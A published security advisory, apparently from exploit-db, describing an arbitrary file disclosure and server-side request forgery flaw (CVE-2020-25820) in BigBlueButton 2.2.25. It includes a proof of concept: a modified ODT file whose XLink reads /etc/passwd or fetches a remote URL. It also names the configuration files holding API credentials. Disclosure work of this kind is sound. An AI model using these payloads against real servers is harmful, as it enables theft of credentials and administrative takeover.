@@ -1,0 +1,237 @@
+# Exploit Title: BigBlueButton 2.2.25 - Arbitrary File Disclosure and Server-Side Request Forgery
+# Date: 2020-09-11
+# Exploit Author: RedTeam Pentesting GmbH
+# Vendor Homepage: https://bigbluebutton.org/
+# Version: BigBlueButton 2.2.25
+
+
+RedTeam Pentesting discovered a vulnerability in the BigBlueButton web
+conferencing system which allows participants of a conference with
+permissions to upload presentations to read arbitrary files from the
+file system and perform server-side requests. This leads to
+administrative access to the BigBlueButton instance.
+
+
+Details
+=======
+
+Product: BigBlueButton
+Affected Versions: 2.2.25, potentially earlier versions as well
+Fixed Versions: 2.2.27
+Vulnerability Type: Arbitrary File Disclosure and
+                    Server-Side Request Forgery
+Security Risk: medium
+Vendor URL: https://bigbluebutton.org/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2020-005
+Advisory Status: published
+CVE: CVE-2020-25820
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25820
+
+
+Introduction
+============
+
+"BigBlueButton is a web conferencing system designed for online
+learning."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+BigBlueButton is a web conferencing system that allows participants with
+the appropriate privileges to upload files in various formats to be used
+as presentation slides. Among other formats, BigBlueButton accepts
+LibreOffice documents[1]. LibreOffice documents use the XML-based Open
+Document Format for Office Applications (ODF)[2]. For technical
+purposes, uploaded files are converted to PDF format with LibreOffice
+and afterwards to SVG for displaying[6].
+
+The ODF file format supports using the XML Linking Language (XLink) to
+create links between documents[3]. When local files are referenced using
+XLinks, the contents of the respective files are included in the
+generated PDF file when BigBlueButton converts ODF documents with
+LibreOffice. This leads to an arbitrary file disclosure vulnerability,
+allowing malicious participants of conferences to extract files from the
+BigBlueButton server's file system.
+
+LibreOffice also embeds XLinks to remote locations when a document is
+converted, which allows to perform server-side requests.
+
+
+Proof of Concept
+================
+
+Start from an empty ODF Text Document and extract the content:
+
+$ mkdir tmp-doc && cd tmp-doc
+$ unzip ../empty.odt
+Archive:  empty.odt
+ extracting: mimetype
+   creating: Configurations2/accelerator/
+   creating: Configurations2/images/Bitmaps/
+   creating: Configurations2/toolpanel/
+   creating: Configurations2/progressbar/
+   creating: Configurations2/statusbar/
+   creating: Configurations2/toolbar/
+   creating: Configurations2/floater/
+   creating: Configurations2/popupmenu/
+   creating: Configurations2/menubar/
+  inflating: manifest.rdf
+  inflating: meta.xml
+  inflating: settings.xml
+ extracting: Thumbnails/thumbnail.png
+  inflating: styles.xml
+  inflating: content.xml
+  inflating: META-INF/manifest.xml
+
+
+Replace the <office:body> element in the file content.xml with the
+following:
+
+<office:body>
+  <office:text>
+    <text:section text:name="string">
+      <text:section-source
+        xlink:href="file:///etc/passwd"
+        xlink:type="simple"
+        xlink:show="embed"
+        xlink:actuate="onLoad"/>
+    </text:section>
+  </office:text>
+</office:body>
+
+The text document now includes a section that references the external
+file /etc/passwd. Create an new ODF Text Document with the modified
+content:
+
+$ zip -r ../modified.odt *
+
+The document can now be uploaded as a presentation. After the
+conversion, the presentation shows the contents of the file
+/etc/passwd from the system running the BigBlueButton conferencing
+software. To perform server-side requests, substitute the xlink:href
+attribute's value with a remote URL such as http://example.com:
+
+<office:body>
+  <office:text>
+    <text:section text:name="string">
+      <text:section-source
+        xlink:href="http://example.com"
+        xlink:type="simple"
+        xlink:show="embed"
+        xlink:actuate="onLoad"/>
+    </text:section>
+  </office:text>
+</office:body>
+
+When converting a document with this content, LibreOffice will fetch the
+website's content and embed it into the generated PDF file.
+
+
+Workaround
+==========
+
+To work around this issue, the conversion feature should be disabled if
+it is not used. Otherwise, permission to upload presentations should
+only be given to trusted users. Additionally, the allowed file types for
+upload can be restricted to just PDF files.
+
+
+Fix
+===
+
+Update to fixed version 2.2.27. Change API key after update.
+
+
+
+Security Risk
+=============
+
+As shown, the presentation conversion feature of BigBlueButton can be
+used to disclose arbitrary local files. Through the file disclosure,
+attackers can gain access to the credentials of the BigBlueButton
+instance (/usr/share/bbb-web/WEB-INF/classes/bigbluebutton.properties,
+/usr/share/bbb-apps-akka/conf/application.conf), which allows for
+administrative access to BigBlueButton through its API (see [5]),
+including all conferences.
+
+Additionally, it is possible to perform server-side requests. Note that
+this vulnerability is different from CVE-2018-10583 [4], because the
+risk is not the disclosure of credentials sent while fetching remote
+resources, but the ability to access resources that are in the same
+network segment as the BigBlueButton instance, which is possibly not
+accessible from the Internet.
+
+To exploit this vulnerability, attackers need to have access to a
+conference with the ability to upload presentations. While successful
+exploitation of this vulnerability would pose severe consequences for
+the affected BigBlueButton instance, it is only rated to pose a medium
+risk due to the requirement of having presentator access.
+
+
+Timeline
+========
+
+2020-09-11 Vulnerability identified
+2020-09-18 Customer approved disclosure to vendor
+2020-09-22 CVE ID requested
+2020-09-22 CVE ID assigned
+2020-09-24 Requested encrypted communication with vendor
+2020-09-25 Vendor unable to provide encrypted communication,
+           Vendor notified
+2020-09-25 Vendor confirmed being able to reproduce vulnerability,
+           mentioned similar bugreport
+2020-09-25 Requested information whether "similar burgreport"
+           uses the same vulnerability - no answer
+2020-10-13 Again requested information whether "similar burgreport"
+           uses the same vulnerability, whether release shedule is
+           known - no answer
+2020-10-14 Vendor released fixed version (without mentioning vulnerability)
+2020-10-21 Vulnerability published by third party [7]
+2020-10-21 Advisory released
+
+
+References
+==========
+
+[1] https://docs.bigbluebutton.org/support/faq.html#can-i-upload-microsoft-office-documents-to-bigbluebutton
+[2] http://opendocumentformat.org/
+[3] https://www.w3.org/TR/xlink11/
+[4] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10583
+[5] https://docs.bigbluebutton.org/dev/api.html#usage
+[6] https://docs.bigbluebutton.org/support/faq.html#presentations
+[7] https://www.golem.de/news/big-blue-button-das-grosse-blaue-sicherheitsrisiko-2010-151610.html
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://www.redteam-pentesting.de/jobs/
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Dennewartstr. 25-27                       Fax : +49 241 510081-99
+52068 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
